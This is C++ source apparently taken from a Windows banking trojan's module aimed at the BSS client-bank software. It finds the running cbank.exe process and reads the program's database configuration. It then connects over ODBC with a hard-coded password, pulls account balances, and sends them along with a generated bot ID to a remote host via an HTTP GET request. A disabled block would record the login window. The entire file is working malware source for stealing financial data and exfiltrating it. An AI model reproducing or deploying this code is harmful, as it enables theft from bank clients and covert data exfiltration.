#include "BBSCBank.h"
//#include <windows.h>
//#include <wininet.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <sqlext.h>

#include "GetApi.h"
#include "Utils.h"
#include "BotUtils.h"
#include "Memory.h"
#include "Strings.h"
#include "VideoRecorder.h"
#include "BotHTTP.h"

//#include "BotDebug.h"

namespace BBS_CALC
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define BBS_DBG BBS_CALC::DBGOutMessage<>


/*
bool IsBBSCBank()
{
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
	bool ret = false;
	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );
	DbgMsgW(L"cbank.exe ", 1, L"%x", dwProcessHash);

	if ( dwProcessHash == 0xD61CFB13 ) //cbank.exe
	{
		DbgMsgW(L"Run cbank.exe ",1,ModulePath);
		ret = true;
	}
	MemFree( ModulePath );
	return ret;
}


void BBSGrabber()
{
	OutputDebugString("BBSGrabber");
}
*/

char szDatabaseParam[]="database",
     szGetBalanceStatement[]="select Rest * 100,Account from Account";

char *GrabBalance(char *lpPath)
{
	BBS_DBG("BBSBank","GrabBalance");
    char *lpBalance=NULL;
    if (lpPath)
    {
        SQLHENV hEnv;
        SQLHANDLE hConn,hBalance=NULL;
        pSQLAllocHandle(SQL_HANDLE_ENV,NULL,&hEnv);
        pSQLSetEnvAttr(hEnv,SQL_ATTR_ODBC_VERSION,(void *)SQL_OV_ODBC3,NULL);
        pSQLAllocHandle(SQL_HANDLE_DBC,hEnv,&hConn);

        char szConfig[MAX_PATH];
        pPathCombineA(szConfig,lpPath,"EXE\\default.cfg");
        UINT bUseAlias=(UINT)pGetPrivateProfileIntA(szDatabaseParam,"aliasconnect",0,szConfig);
        char szUser[20];
        pGetPrivateProfileStringA(szDatabaseParam,"username",0,szUser,20,szConfig);

        do
        {
            if (bUseAlias)
            {
                char szAlias[200];
                int dwLen=(int)pGetPrivateProfileStringA(szDatabaseParam,"alias",0,szAlias,200,szConfig);

                SQLSMALLINT tmp=0;
                SQLRETURN retcode=(SQLRETURN)pSQLConnectA(hConn,(SQLCHAR*)szAlias,dwLen,(SQLCHAR*)szUser,lstrlenA(szUser),(SQLCHAR*)"sql",3);
                if ((retcode != SQL_SUCCESS) && (retcode != SQL_SUCCESS_WITH_INFO))
                    break;
            }
            else
            {
                char szConnectString[400];
                int dwLen=(int)pGetPrivateProfileStringA(szDatabaseParam,"connectstring",0,szConnectString,200,szConfig);
                char *p;
                if (p=(char*)pStrStrA(szConnectString,"%BSSRoot%"))
                {
                    char szTmpStr[200];
                    plstrcpyA(szTmpStr,p+sizeof("%BSSRoot%")-1);
                    plstrcpyA(p,lpPath);
                    p+=(int)plstrlenA(lpPath);
                    plstrcpyA(p,szTmpStr);
                    dwLen=(int)plstrlenA(szConnectString)+1;
                }
                if (szConnectString[dwLen-1] != ';')
                {
                    *(WORD*)&szConnectString[dwLen-1]=';';
                    dwLen++;
                }
                //char szUserPassword[40];
                //dwLen+=(int)ppwsprintfA(szUserPassword,"UID=%s;PWD=sql;",szUser);
				plstrcatA(szConnectString,"UID=");
				plstrcatA(szConnectString,szUser);
				plstrcatA(szConnectString,";");
				plstrcatA(szConnectString,"PWD=sql;");
                //plstrcatA(szConnectString,szUserPassword);
                char szStr[512];
                SQLSMALLINT tmp;
                SQLRETURN retcode=(SQLRETURN)pSQLDriverConnectA(hConn,NULL,(SQLCHAR*)szConnectString,SQL_NTS,(unsigned char *)szStr,sizeof(szStr),&tmp,SQL_DRIVER_COMPLETE);
                if ((retcode != SQL_SUCCESS) && (retcode != SQL_SUCCESS_WITH_INFO))
                    break;
            }
            SQLHANDLE hBalance=NULL;
            pSQLAllocHandle(SQL_HANDLE_STMT,hConn,&hBalance);
            pSQLPrepareA(hBalance,(SQLCHAR*)szGetBalanceStatement,sizeof(szGetBalanceStatement));
            SQLINTEGER tmp=0;
            //SQLDOUBLE Rest=0;
			SQLINTEGER Rest=0;
            //pSQLBindCol(hBalance,1,SQL_C_DOUBLE,&Rest,sizeof(Rest),&tmp);
            pSQLBindCol(hBalance,1,SQL_C_SLONG,&Rest,sizeof(Rest),&tmp);
            SQLCHAR Account[25]={0};
            pSQLBindCol(hBalance,2,SQL_C_CHAR,&Account,sizeof(Account),&tmp);
            pSQLExecute(hBalance);

            lpBalance=(char*)MemAlloc(1024); lpBalance[0] = 0;
            SQLRETURN dwRet;
            while (((dwRet=(SQLRETURN)pSQLFetch(hBalance)) == SQL_SUCCESS) || (dwRet == SQL_SUCCESS_WITH_INFO))
            {
				//������������ ����� � ������
				char szRest[16], buf[16];
				int i = 0;
				if( Rest < 0 )
				{
					szRest[0] = '-';
					Rest = -Rest;
				}
				else
					szRest[0] = ' ';
				do 
				{
					buf[i++] = (Rest % 10) + '0';
					Rest /= 10;
				} while( Rest );
				szRest[i + 1] = 0;
				char* ps = szRest + 1;
				while( --i >= 0 ) *ps++ = buf[i];

                //DWORD dwLen=(DWORD)wsprintfA(szTmp,"%s: %d",Account,Rest);
               // if (lpBalance[0]) plstrcatA( lpBalance, ";" );
               // plstrcatA(lpBalance, Account);
				//plstrcatA(lpBalance, ": ");
                plstrcpyA(lpBalance, szRest);
            }
            lpBalance = (char*)MemRealloc(lpBalance, (DWORD)plstrlenA(lpBalance));
            pSQLCloseCursor(hBalance);
            pSQLFreeHandle(SQL_HANDLE_STMT,hBalance);
        }
        while (false);
        pSQLDisconnect(hConn);
        pSQLFreeHandle(SQL_HANDLE_ENV,hEnv);
        pSQLFreeHandle(SQL_HANDLE_ENV,hBalance);
        pSQLFreeHandle(SQL_HANDLE_DBC,hConn);
    }
    return lpBalance;
}


static DWORD IsRunBClient(char* path)
{
	BBS_DBG("BBSBank","IsRunBClient");
	HANDLE snap = pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);
	pProcess32FirstW( snap, &pe );
	DWORD ret = 0;
	do
	{
		DWORD dwProcessHash = GetNameHash(pe.szExeFile);
		if ( dwProcessHash == 0xFE0E05F6 ) //cbmain.ex -> cbank.exe
		{
			if( path[0] == 0 ) 
			{
				HANDLE hProc = pOpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID );
				if (hProc)
				{
					pGetModuleFileNameExA( hProc, 0, path, MAX_PATH );
					pCloseHandle(hProc);
				}
			}
			ret = pe.th32ProcessID;
			break;
		}
	} while( pProcess32NextW( snap, &pe ) );
	pCloseHandle(snap);
	return ret;
}

void WINAPI ThreadBBS(void*)
{
	BBS_DBG("BBSBank","ThreadBBS");
	DWORD idCBank = 0;
	char path[MAX_PATH];
	path[0] = 0;
	while(true)
	{
		DWORD id = IsRunBClient(path);
		if( idCBank == 0 )
		{
			if( id )
			{
				BBS_DBG("BBSBank",path);
				idCBank = id;
				pPathRemoveFileSpecA(path); //������� ��� �����
				pPathRemoveFileSpecA(path); //������� ����� EXE
				char* sum= GrabBalance(path);
				pOutputDebugStringA( sum ? sum : "null" );
				
				// http://91.228.133.67/boffl.php?uid=sdf23dsffdsf&bal=2324324243
				PCHAR Buf = NULL;
				
				PCHAR UID=  GenerateBotID();
				PCHAR URL= STR::New(4,"http://ibanksystemdwersfssnk.com/boffl.php?uid=",UID,"&bal=",&sum[1]);
				
				HTTP::Get(URL, &Buf, NULL);
				STR::Free(URL);
				STR::Free(UID);

				/*BBS_DBG("BBSBank","����� �����.");
				DWORD PID = 0;
				pGetWindowThreadProcessId(pFindWindowA("TLoginWindow",NULL), &PID);
				if(PID != 0) 
					StartRecordThread(PID,"BBSBank", NULL, NULL,700);
				*/
				MemFree(sum);
			}
		}
		else
			if( id == 0 )
			{
				idCBank = 0;
				path[0] = 0;
			}
		pSleep(1000*2);
	}
}

void RunThreadBBS()
{
	pCloseHandle( pCreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)ThreadBBS,(LPVOID)0, 0, NULL ));
}
